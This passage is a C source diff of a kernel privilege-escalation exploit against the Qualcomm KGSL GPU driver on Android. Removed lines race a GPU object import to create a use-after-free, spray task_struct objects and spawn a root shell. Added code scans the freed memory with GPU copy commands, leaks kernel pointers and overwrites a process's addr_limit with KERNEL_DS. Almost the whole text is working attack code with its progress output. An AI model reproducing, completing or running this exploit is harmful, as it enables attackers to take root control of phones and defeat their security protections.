-    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
-}
+#define USER_DS   0x0000007fffffffffULL
+#define KERNEL_DS 0xffffffffffffffffULL
 
-static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
-    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
-    struct kgsl_command_object cmd_obj = {
-        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
-        .flags = KGSL_CMDLIST_IB, .id = ib_id
+static int scan_uaf_for_nonzero_multi(int fd,
+                                      struct nonzero_page *found_pages,
+                                      int *num_found)
+{
+    unsigned int ctx_id = 0, ib_id = 0, dst_id = 0;
+    uint64_t ib_gpu = 0, dst_gpu = 0;
+    void *ib_vma = NULL, *dst_vma = NULL;
+    int found = 0;
+    char only_once =  0;
+    *num_found = 0;
+
+    fprintf(stderr, "\n[+] Scanning UAF region for non-zero pages\n");
+    fprintf(stderr, "    Region: 0x%llx ~ 0x%llx (256MB)\n",
+            (unsigned long long)UAF_START,
+            (unsigned long long)(UAF_START + UAF_SIZE));
+    fflush(stderr);
+
+    struct kgsl_drawctxt_create ctx = {
+        .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
     };
-    struct kgsl_gpu_command gc = {0};
-    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
-    gc.cmdsize = sizeof(cmd_obj);
-    gc.numcmds = 1;
-    gc.context_id = ctx_id;
-    int ret = ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gc);
-    if (out_ts) *out_ts = gc.timestamp;
-    return ret;
-}
+    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) {
+        fprintf(stderr, "    [!] Failed to create GPU context\n");
+        fflush(stderr);
+        return 0;
+    }
+    ctx_id = ctx.drawctxt_id;
 
-static void *race_thread(void *arg) {
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
-    struct kgsl_gpuobj_import imp = {
-        .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
-        .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
+    struct kgsl_gpuobj_alloc ib_alloc = {
+        .size  = PAGE_SIZE * 8,
+        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
     };
-    while (!race_done) ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
-    return NULL;
-}
-
-int main(int argc, char **argv) {
-    setbuf(stdout, NULL);
-
-    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
-    if (kgsl_fd < 0) die("open kgsl");
-    printf("[+] kgsl fd=%d\n", kgsl_fd);
-
-    // 检测 KASLR
-    printf("[*] Phase 0: Early KASLR detection\n");
-    uint64_t init_cred_addr = detect_kaslr();
-    if (!init_cred_addr) {
-        printf("[-] Failed to detect init_cred, using hardcoded fallback (may fail)\n");
-        init_cred_addr = VMLINUX_INIT_CRED; // 可能不准确
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0) {
+        goto cleanup;
     }
-    printf("  init_cred=0x%lX\n", init_cred_addr);
+    ib_id = ib_alloc.id;
+    ib_vma = mmap(NULL, ib_alloc.mmapsize, PROT_READ | PROT_WRITE,
+                  MAP_SHARED, fd, ((off_t)ib_id) << 12);
+    if (ib_vma == MAP_FAILED)
+        goto cleanup;
 
-    // ===== Phase 1: Setup rbtree =====
-    printf("[*] Phase 1: Setup rbtree\n");
+    struct kgsl_gpuobj_info info = { .id = ib_id };
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+    ib_gpu = info.gpuaddr;
 
-    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
-    printf("  Using alloc_flags=0x%lx (WRITEBACK cache mode)\n", (unsigned long)alloc_flags);
-    int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
-    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
-    if (uaf_m == MAP_FAILED) die("mmap UAF");
-    munmap(uaf_m, UAF_SIZE);
-
-    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
-        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
-
-    int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
-        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
-    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
-
-    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
-        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
-        (unsigned long)PLACEHOLDER_ADDR);
-
-    // ===== Phase 2: Race =====
-    printf("[*] Phase 2: Race\n");
-
-    int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
-
-    pthread_t thr;
-    if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
-
-    int hit = 0;
-    for (int i = 0; i < 5000000; i++) {
-        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
-            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-            kgsl_fd, (off_t)ov_id << 12);
-        int e = errno;
-        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
-        if (e == ENODEV) { hit = 1; break; }
-        if (i % 500000 == 0) printf("  race %d/%d errno=%d\n", i, 5000000, e);
+    struct kgsl_gpuobj_alloc dst_alloc = {
+        .size  = PAGE_SIZE,
+        .flags = KGSL_MEMFLAGS_USE_CPU_MAP
+    };
+    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &dst_alloc) != 0) {
+        goto cleanup;
     }
+    dst_id = dst_alloc.id;
+    dst_vma = mmap(NULL, dst_alloc.mmapsize, PROT_READ | PROT_WRITE,
+                   MAP_SHARED, fd, ((off_t)dst_id) << 12);
+    if (dst_vma == MAP_FAILED)
+        goto cleanup;
 
-    race_done = 1;
-    pthread_join(thr, NULL);
+    info.id = dst_id;
+    ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
+    dst_gpu = info.gpuaddr;
 
-    if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
-    printf("[+] Race won! (errno=ENODEV)\n");
+    fprintf(stderr, "    [+] Buffers ready\n");
+    fprintf(stderr, "    [*] Scanning... (. = 100 pages)\n");
+    fflush(stderr);
 
-    // ===== Phase 3: Free UAF =====
-    printf("[*] Phase 3: Free UAF\n");
-    gpuobj_free(kgsl_fd, uaf_id);
-    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n",
-        (unsigned long)(UAF_ADDR + 0x1000));
+    uint64_t user_ds   = USER_DS;
+    uint64_t kernel_ds = KERNEL_DS;
+    uint32_t uds_lo = (uint32_t)(user_ds & 0xffffffffu);
+    uint32_t uds_hi = (uint32_t)(user_ds >> 32);
+    uint32_t kds_lo = (uint32_t)(kernel_ds & 0xffffffffu);
+    uint32_t kds_hi = (uint32_t)(kernel_ds >> 32);
 
-    // ===== Phase 4: Reclaim =====
-    printf("[*] Phase 4: Reclaim pages\n");
-    int rf = open("/proc/sys/vm/compact_memory", O_WRONLY);
-    if (rf >= 0) { write(rf, "1", 1); close(rf); }
-    rf = open("/proc/sys/vm/drop_caches", O_WRONLY);
-    if (rf >= 0) { write(rf, "3", 1); close(rf); }
-    usleep(10000);
+    uint64_t start_va   = UAF_START;
+    uint64_t end_va     = UAF_START + UAF_SIZE;
+    uint64_t current_va = start_va;
+    int pages_scanned   = 0;
+    int non_zero_pages  = 0;
+    int no_candidate_run = 0;
 
-    // ===== Phase 5: First spawn + pipe setup =====
-    printf("[*] Phase 5: Spawning task_struct spray...\n");
-    int notify_pipe[2];
-    if (pipe(notify_pipe) < 0) die("pipe");
-    fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
-    fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);
+    while (current_va < end_va) {
+        // CP_MEM_TO_MEM 
+        uint32_t *cmd = (uint32_t *)ib_vma;
+        memset(ib_vma, 0, ib_alloc.mmapsize);
+        memset(dst_vma, 0, dst_alloc.mmapsize);
+        int dw = 0;
 
-    pid_t spray_pids[SPRAY_PIDS];
-    int n_spray = 0;
-    for (int i = 0; i < SPRAY_PIDS; i++) {
-        pid_t p = fork();
-        if (p == 0) {
-            close(notify_pipe[0]);
-            prctl(PR_SET_NAME, "TASKUAF!!");
-            for (int j = 0; j < 1800; j++) {
-                usleep(200000);
-                if (getuid() == 0) {
-                    // 等待 GPU 写完成
-                    usleep(50000);
-                    pid_t me = getpid();
-                    int fd = open("/proc/self/status", O_RDONLY);
-                        if (fd >= 0) {
-                            char buf[4096]; int n;
-                            while ((n = read(fd, buf, sizeof(buf))) > 0)
-                                write(1, buf, n);
-                            close(fd);
-                        }
-                        write(notify_pipe[1], &me, sizeof(me));
-                        write(1, "### ROOT SHELL ACTIVE ###\n", 26);
-                        close(notify_pipe[1]);
-                        usleep(50000);
-                        char buf[4096]; int n;
-                        // SELinux context
-                        fd = open("/proc/self/attr/current", O_RDONLY);
-                        if (fd >= 0) {
-                            write(1, "  SELinux: ", 11);
-                            while ((n = read(fd, buf, sizeof(buf))) > 0) write(1, buf, n);
-                            write(1, "\n", 1);
-                            close(fd);
-                        }
-                        // seccomp
-                        int sec = prctl(PR_GET_SECCOMP, 0, 0, 0, 0);
-                        write(1, "  Seccomp: ", 11);
-                        char ebuf[32]; int elen = snprintf(ebuf, sizeof(ebuf), "%d\n", sec);
-                        write(1, ebuf, elen);
-                        int nnp = prctl(PR_GET_NO_NEW_PRIVS, 0, 0, 0, 0);
-                        write(1, "  NoNewPrivs: ", 15);
-                        elen = snprintf(ebuf, sizeof(ebuf), "%d\n", nnp);
-                        write(1, ebuf, elen);
-                        write(1, "  uid=", 6);
-                        elen = snprintf(ebuf, sizeof(ebuf), "%d euid=%d gid=%d egid=%d\n",
-                            getuid(), geteuid(), getgid(), getegid());
-                        write(1, ebuf, elen);
-                        fd = open("/proc/self/status", O_RDONLY);
-                        if (fd >= 0) {
-                            n = read(fd, buf, sizeof(buf)-1);
-                            close(fd);
-                            if (n > 0) {
-                                buf[n] = 0;
-                                char *lp = buf, *nl;
-                                while ((nl = strstr(lp, "\n")) != NULL) {
-                                    *nl = 0;
-                                    if (strncmp(lp, "CapPrm:", 7) == 0 || strncmp(lp, "CapEff:", 7) == 0 ||
-                                        strncmp(lp, "CapBnd:", 7) == 0 || strncmp(lp, "CapInh:", 7) == 0 ||
-                                        strncmp(lp, "Uid:", 4) == 0 || strncmp(lp, "Gid:", 4) == 0) {
-                                        write(1, "  ", 2); write(1, lp, nl - lp); write(1, "\n", 1);
-                                    }
-                                    lp = nl + 1;
+        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+        for (int i = 0; i < 1024; i++) {
+            uint32_t d_lo, d_hi, s_lo, s_hi;
+            split64(dst_gpu + (uint64_t)i * 4, &d_lo, &d_hi);
+            split64(current_va + (uint64_t)i * 4, &s_lo, &s_hi);
+
+            cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0x00000000;
+            cmd[dw++] = d_lo;
+            cmd[dw++] = d_hi;
+            cmd[dw++] = s_lo;
+            cmd[dw++] = s_hi;
+        }
+
+        cmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+        size_t ib_bytes = (size_t)dw * 4;
+        msync(ib_vma, ib_bytes, MS_SYNC);
+
+        struct kgsl_command_object cmd_obj = {
+            .gpuaddr = ib_gpu,
+            .size    = ib_bytes,
+            .flags   = KGSL_CMDLIST_IB,
+            .id      = ib_id
+        };
+
+        struct kgsl_gpu_command gpu_cmd = {0};
+        gpu_cmd.cmdlist    = (uint64_t)(uintptr_t)&cmd_obj;
+        gpu_cmd.cmdsize    = sizeof(cmd_obj);
+        gpu_cmd.numcmds    = 1;
+        gpu_cmd.context_id = ctx_id;
+
+        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0) {
+            fprintf(stderr, "\n      [!] GPU command failed\n");
+            fflush(stderr);
+            break;
+        }
+
+        if (wait_timestamp(fd, ctx_id, gpu_cmd.timestamp) != 0) {
+            fprintf(stderr, "\n      [!] GPU timeout\n");
+            fflush(stderr);
+            break;
+        }
+
+        msync(dst_vma, dst_alloc.mmapsize, MS_SYNC | MS_INVALIDATE);
+
+        uint32_t *data = (uint32_t *)dst_vma;
+        uint8_t  *bytes = (uint8_t *)dst_vma;
+        int non_zero = 0;
+        for (int i = 0; i < 1024; i++) {
+            if (data[i] != 0)
+                non_zero++;
+        }
+
+        pages_scanned++;
+
+        if (pages_scanned % 100 == 0) {
+            fprintf(stderr, ".");
+            fflush(stderr);
+        }
+
+        if (pages_scanned % 1000 == 0) {
+            fprintf(stderr,
+                    "\n      Progress: %d pages (%.1f%%), Found(>=300): %d\n",
+                    pages_scanned,
+                    (pages_scanned * 100.0) / 65535.0,
+                    non_zero_pages);
+            fflush(stderr);
+        }
+
+        if (non_zero < 350 || non_zero > 390) {
+            no_candidate_run++;
+            if (no_candidate_run >= 9000) {
+                fprintf(stderr,
+                        "\n      [!] No candidate pages in last %d pages, aborting scan\n",
+                        no_candidate_run);
+                fflush(stderr);
+                break;
+            }
+        } else {
+            no_candidate_run = 0;
+        }
+
+        if (non_zero >= 350 && non_zero <= 390) {
+            fprintf(stderr,
+                    "\n      [%d] Found at VA 0x%llx (page %d, non-zero: %d/1024)\n",
+                    non_zero_pages + 1,
+                    (unsigned long long)current_va,
+                    pages_scanned,
+                    non_zero);
+            fflush(stderr);
+
+            // 1) Find KETO0422 pattern 
+            pid_t comm_pid = -1;
+            int comm_off = -1;
+            for (int off = 0; off < 4096 - 8; off++) {
+                if (memcmp(bytes + off, "KETO0422", 8) == 0) {
+                    fprintf(stderr,
+                            "        [+] Found KETO0422 at offset 0x%03x\n", off);
+                    fprintf(stderr,
+                            "            Comm: %.16s\n", bytes + off);
+                    comm_off = off;
+                    char numbuf[6] = {0};
+                    memcpy(numbuf,bytes+off+8,5);
+                    comm_pid = (pid_t)atoi(numbuf);
+                    fprintf(stderr, "            Parsed PID: %d\n", comm_pid);
+                    break;
+
+                }
+            }
+
+            // 2) Find USER_DS value (FFFFFFFF 0000007F)
+            int userds_off = -1;
+            for (int i = 0; i < 1023; i++) {
+                if (data[i] == uds_lo && data[i + 1] == uds_hi) {
+                    int off = i * 4;
+                    uint64_t val = ((uint64_t)uds_hi << 32) | uds_lo;
+                    fprintf(stderr,
+                            "        [+] Found USER_DS at offset 0x%03x\n", off);
+                    fprintf(stderr,
+                            "            [0x%03x] %08X %08X\n",
+                            off, data[i], data[i + 1]);
+                    fprintf(stderr,
+                            "            Value: 0x%016llx\n",
+                            (unsigned long long)val);
+                    userds_off = off;
+                    break;
+                }
+            }
+            
+
+            //* 3) Dump and Store
+            if (userds_off >= 0 && only_once < 1 &&
+                userds_off == 0x40 && comm_off == 0x860) {
+                only_once++;
+                uint64_t page_va = current_va;
+                current_va = end_va; // Actually, only once
+                fprintf(stderr,
+                        "        [DUMP BEFORE PATCH] VA 0x%llx, USER_DS off=0x%03x\n",
+                        (unsigned long long)page_va, userds_off);
+                {
+                    uint64_t ptr_val = *(uint64_t *)(bytes + 0x850);
+                    *(uint64_t *)&gbuf[0x10] = ptr_val;
+                    fprintf(stderr,
+                            "        [*] Saved 0x850 pointer 0x%016llx into gbuf+0x10\n",
+                            (unsigned long long)ptr_val);
+                    ptr_val = (*(uint64_t *)(bytes + 0x888)) -0x2BB8CF8;
+                    *(uint64_t *)&gbuf[0x20] = ptr_val;
+                    fprintf(stderr,
+                            "        [*] Saved 0x888 pointer 0x%016llx into gbuf+0x20\n",
+                            (unsigned long long)ptr_val);
+                    ptr_val = *(uint64_t *)(bytes + 0x5a8);
+                    if (ptr_val > 0)
+                    {
+                        *(uint64_t *)&gbuf[0x30] = ptr_val;
+                        fprintf(stderr,
+                                "        [*] Saved 0x5a8 pointer 0x%016llx into gbuf+0x30\n",
+                                (unsigned long long)ptr_val);
+                    }
+                    else{
+                        fprintf(stderr,"wrOng\n");
+                        _exit(1);
+                    }
+                    
+                }
+                
+                for (int off = 0; off < 4096; off += 0x20) {
+                    int idx = off / 4;
+                    fprintf(stderr, "          [0x%03x] %08X %08X %08X %08X %08X %08X %08X %08X\n",
+                            off,
+                            data[idx + 0], data[idx + 1], data[idx + 2], data[idx + 3],
+                            data[idx + 4], data[idx + 5], data[idx + 6], data[idx + 7]);
+                }
+                            
+                fflush(stderr);
+
+ 
+                uint64_t target_addr = page_va + (uint64_t)userds_off;
+                fprintf(stderr,
+                        "        [*] Patching addr_limit at VA 0x%llx to KERNEL_DS\n",
+                        (unsigned long long)target_addr);
+
+                memset(ib_vma, 0, ib_alloc.mmapsize);
+                dw = 0;
+
+                uint32_t *wcmd = (uint32_t *)ib_vma;
+
+                for (int i = 0; i < 4; i++)
+                    wcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+                uint32_t t_lo, t_hi;
+
+                split64(target_addr, &t_lo, &t_hi);
+                wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
+                wcmd[dw++] = t_lo;
+                wcmd[dw++] = t_hi;
+                wcmd[dw++] = kds_lo;
+
+                split64(target_addr + 4, &t_lo, &t_hi);
+                wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
+                wcmd[dw++] = t_lo;
+                wcmd[dw++] = t_hi;
+                wcmd[dw++] = kds_hi;
+
+                for (int i = 0; i < 4; i++)
+                    wcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+                size_t patch_ib_bytes = (size_t)dw * 4;
+                msync(ib_vma, patch_ib_bytes, MS_SYNC);
+
+                struct kgsl_command_object patch_obj = {
+                    .gpuaddr = ib_gpu,
+                    .size    = patch_ib_bytes,
+                    .flags   = KGSL_CMDLIST_IB,
+                    .id      = ib_id
+                };
+
+                struct kgsl_gpu_command patch_cmd = {0};
+                patch_cmd.cmdlist    = (uint64_t)(uintptr_t)&patch_obj;
+                patch_cmd.cmdsize    = sizeof(patch_obj);
+                patch_cmd.numcmds    = 1;
+                patch_cmd.context_id = ctx_id;
+
+                if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &patch_cmd) != 0) {
+                    fprintf(stderr,
+                            "        [!] GPU patch command failed: %s\n",
+                            strerror(errno));
+                } else if (wait_timestamp(fd, ctx_id, patch_cmd.timestamp) != 0) {
+                    fprintf(stderr, "        [!] GPU patch timeout\n");
+                } else {
+                    fprintf(stderr,
+                            "        [+] addr_limit patched to KERNEL_DS (0x%016llx)\n",
+                            (unsigned long long)kernel_ds);
+
+                    memset(dst_vma, 0, dst_alloc.mmapsize);
+
+                    uint32_t *vcmd = (uint32_t *)ib_vma;
+                    uint32_t d_lo, d_hi, s_lo, s_hi;
+
+                    memset(ib_vma, 0, ib_alloc.mmapsize);
+                    dw = 0;
+                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+                    split64(dst_gpu, &d_lo, &d_hi);
+                    split64(target_addr, &s_lo, &s_hi);
+                    vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
+                    vcmd[dw++] = 0x00000000;
+                    vcmd[dw++] = d_lo;
+                    vcmd[dw++] = d_hi;
+                    vcmd[dw++] = s_lo;
+                    vcmd[dw++] = s_hi;
+                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+                    size_t verify_ib_bytes = (size_t)dw * 4;
+                    msync(ib_vma, verify_ib_bytes, MS_SYNC);
+
+                    struct kgsl_command_object verify_obj = {
+                        .gpuaddr = ib_gpu,
+                        .size    = verify_ib_bytes,
+                        .flags   = KGSL_CMDLIST_IB,
+                        .id      = ib_id
+                    };
+
+                    struct kgsl_gpu_command verify_cmd = {0};
+                    verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
+                    verify_cmd.cmdsize    = sizeof(verify_obj);
+                    verify_cmd.numcmds    = 1;
+                    verify_cmd.context_id = ctx_id;
+
+                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) != 0 ||
+                        wait_timestamp(fd, ctx_id, verify_cmd.timestamp) != 0) {
+                        fprintf(stderr,
+                                "        [!] GPU verify(low) failed\n");
+                    } else {
+                        msync(dst_vma, dst_alloc.mmapsize,
+                              MS_SYNC | MS_INVALIDATE);
+                    }
+
+                    memset(ib_vma, 0, ib_alloc.mmapsize);
+                    dw = 0;
+                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+                    split64(dst_gpu + 4, &d_lo, &d_hi);
+                    split64(target_addr + 4, &s_lo, &s_hi);
+                    vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
+                    vcmd[dw++] = 0x00000000;
+                    vcmd[dw++] = d_lo;
+                    vcmd[dw++] = d_hi;
+                    vcmd[dw++] = s_lo;
+                    vcmd[dw++] = s_hi;
+                    vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+                    verify_ib_bytes = (size_t)dw * 4;
+                    msync(ib_vma, verify_ib_bytes, MS_SYNC);
+
+                    verify_obj.gpuaddr = ib_gpu;
+                    verify_obj.size    = verify_ib_bytes;
+                    verify_obj.id      = ib_id;
+
+                    memset(&verify_cmd, 0, sizeof(verify_cmd));
+                    verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
+                    verify_cmd.cmdsize    = sizeof(verify_obj);
+                    verify_cmd.numcmds    = 1;
+                    verify_cmd.context_id = ctx_id;
+
+                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) != 0 ||
+                        wait_timestamp(fd, ctx_id, verify_cmd.timestamp) != 0) {
+                        fprintf(stderr,
+                                "        [!] GPU verify(high) failed\n");
+                    } else {
+                        msync(dst_vma, dst_alloc.mmapsize,
+                              MS_SYNC | MS_INVALIDATE);
+                    }
+
+                    uint32_t *vdata = (uint32_t *)dst_vma;
+                    fprintf(stderr,
+                            "        [*] Verify: %08X %08X\n",
+                            vdata[0], vdata[1]);
+                    if (vdata[0] == kds_lo && vdata[1] == kds_hi) {
+                        fprintf(stderr,
+                                "        [+++] addr_limit KERNEL_DS confirmed\n");
+                        *(uint32_t *)&gbuf[CUR_PID]=comm_pid;
+                        int scc=0;
+                        if (comm_pid >0 && spray_ctrl != NULL){
+                            for (int si=0; si<spray_count;si++){
+                                if (spray_ctrl[si].pid == comm_pid){
+                                    fprintf(stderr," [*] Trigger spary slot %d (pid=%d)\n",si,spray_ctrl[si].pid);
+                                    spray_ctrl[si].do_action=1;
+                                    *(uint64_t *)&gbuf[TARGET_PIDPID] = spray_ctrl[si].pid;
+                                    scc=1;
+
                                 }
                             }
                         }
-                        write(1, "  Spawning shell...\n", 20);
-                        execl("/system/bin/sh", "sh", NULL);
-                        write(1, "  sh exec failed: ", 18);
-                        elen = snprintf(ebuf, sizeof(ebuf), "%d\n", errno);
-                        write(1, ebuf, elen);
-                        _exit(0);
+                        if (scc==0){
+                            fprintf(stderr,"[!!] Something wrong!! no do_action. not Spray\n");
+                            exit(1);
+                        }
+                    } else {
+                        fprintf(stderr,
+                                "        [!!!] addr_limit patch mismatch: read 0x%08X%08X expected 0x%08X%08X at VA 0x%llx (off 0x%03x)\n",
+                                vdata[1], vdata[0],
+                                kds_hi, kds_lo,
+                                (unsigned long long)target_addr,
+                                userds_off);
+                        /* Retry once */
+                        memset(ib_vma, 0, ib_alloc.mmapsize);
+                        dw = 0;
+                        wcmd = (uint32_t *)ib_vma;
+                        for (int i = 0; i < 4; i++)
+                            wcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+                        split64(target_addr, &t_lo, &t_hi);
+                        wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
+                        wcmd[dw++] = t_lo;
+                        wcmd[dw++] = t_hi;
+                        wcmd[dw++] = kds_lo;
+                        split64(target_addr + 4, &t_lo, &t_hi);
+                        wcmd[dw++] = cp_type7_packet(CP_MEM_WRITE, 3);
+                        wcmd[dw++] = t_lo;
+                        wcmd[dw++] = t_hi;
+                        wcmd[dw++] = kds_hi;
+                        for (int i = 0; i < 4; i++)
+                            wcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+
+                        patch_ib_bytes = (size_t)dw * 4;
+                        msync(ib_vma, patch_ib_bytes, MS_SYNC);
+                        patch_obj.gpuaddr = ib_gpu;
+                        patch_obj.size    = patch_ib_bytes;
+                        patch_obj.id      = ib_id;
+                        memset(&patch_cmd, 0, sizeof(patch_cmd));
+                        patch_cmd.cmdlist    = (uint64_t)(uintptr_t)&patch_obj;
+                        patch_cmd.cmdsize    = sizeof(patch_obj);
+                        patch_cmd.numcmds    = 1;
+                        patch_cmd.context_id = ctx_id;
+
+                        if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &patch_cmd) == 0 &&
+                            wait_timestamp(fd, ctx_id, patch_cmd.timestamp) == 0) {
+                            /* Re-verify after retry */
+                            memset(dst_vma, 0, dst_alloc.mmapsize);
+                            memset(ib_vma, 0, ib_alloc.mmapsize);
+                            dw = 0;
+                            vcmd = (uint32_t *)ib_vma;
+                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+                            split64(dst_gpu, &d_lo, &d_hi);
+                            split64(target_addr, &s_lo, &s_hi);
+                            vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
+                            vcmd[dw++] = 0;
+                            vcmd[dw++] = d_lo;
+                            vcmd[dw++] = d_hi;
+                            vcmd[dw++] = s_lo;
+                            vcmd[dw++] = s_hi;
+                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+                            verify_ib_bytes = (size_t)dw * 4;
+                            msync(ib_vma, verify_ib_bytes, MS_SYNC);
+                            verify_obj.gpuaddr = ib_gpu;
+                            verify_obj.size    = verify_ib_bytes;
+                            verify_obj.id      = ib_id;
+                            memset(&verify_cmd, 0, sizeof(verify_cmd));
+                            verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
+                            verify_cmd.cmdsize    = sizeof(verify_obj);
+                            verify_cmd.numcmds    = 1;
+                            verify_cmd.context_id = ctx_id;
+                            if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) == 0 &&
+                                wait_timestamp(fd, ctx_id, verify_cmd.timestamp) == 0) {
+                                msync(dst_vma, dst_alloc.mmapsize,
+                                      MS_SYNC | MS_INVALIDATE);
+                            }
+                            /* high dword */
+                            memset(ib_vma, 0, ib_alloc.mmapsize);
+                            dw = 0;
+                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+                            split64(dst_gpu + 4, &d_lo, &d_hi);
+                            split64(target_addr + 4, &s_lo, &s_hi);
+                            vcmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
+                            vcmd[dw++] = 0;
+                            vcmd[dw++] = d_lo;
+                            vcmd[dw++] = d_hi;
+                            vcmd[dw++] = s_lo;
+                            vcmd[dw++] = s_hi;
+                            vcmd[dw++] = cp_type7_packet(CP_NOP, 0);
+                            verify_ib_bytes = (size_t)dw * 4;
+                            msync(ib_vma, verify_ib_bytes, MS_SYNC);
+                            verify_obj.gpuaddr = ib_gpu;
+                            verify_obj.size    = verify_ib_bytes;
+                            verify_obj.id      = ib_id;
+                            memset(&verify_cmd, 0, sizeof(verify_cmd));
+                            verify_cmd.cmdlist    = (uint64_t)(uintptr_t)&verify_obj;
+                            verify_cmd.cmdsize    = sizeof(verify_obj);
+                            verify_cmd.numcmds    = 1;
+                            verify_cmd.context_id = ctx_id;
+                            if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &verify_cmd) == 0 &&
+                                wait_timestamp(fd, ctx_id, verify_cmd.timestamp) == 0) {
+                                msync(dst_vma, dst_alloc.mmapsize,
+                                      MS_SYNC | MS_INVALIDATE);
+                            }
+
+                            vdata = (uint32_t *)dst_vma;
+                            fprintf(stderr,
+                                    "        [*] Retry verify: %08X %08X\n",
+                                    vdata[0], vdata[1]);
+                            if (vdata[0] == kds_lo && vdata[1] == kds_hi) {
+                                fprintf(stderr,
+                                        "        [+++] addr_limit KERNEL_DS confirmed after retry\n");
+                                *(uint32_t *)&gbuf[CUR_PID]=comm_pid;
+                                if (comm_pid >0 && spray_ctrl != NULL){
+                                    for (int si=0; si<spray_count;si++){
+                                        if (spray_ctrl[si].pid == comm_pid){
+                                            fprintf(stderr," [*] Trigger spary slot %d (pid=%d)\n",si,spray_ctrl[si].pid);
+
+                                        }
+                                    }
+                                }
+                            } else {
+                                fprintf(stderr,
+                                        "        [!!!] addr_limit patch still mismatched after retry: read 0x%08X%08X\n",
+                                        vdata[1], vdata[0]);
+                            }
+                        }
+                    }
+                }
+                fflush(stderr);
+            }
+
+            if (only_once == 1) {
+                if (non_zero_pages < FINDING) {
+                    found_pages[non_zero_pages].va             = current_va;
+                    found_pages[non_zero_pages].non_zero_count = non_zero;
+                    memcpy(found_pages[non_zero_pages].data, data, 4096);
+                }
+                non_zero_pages = 1;
+                fprintf(stderr,
+                        "      [*] task_struct confirmed, stopping scan\n");
+                fflush(stderr);
+                found = 1;
+                break;
+            }
+        }
+
+        current_va += PAGE_SIZE;
+    }
+
+    fprintf(stderr, "\n    [*] Scan complete:\n");
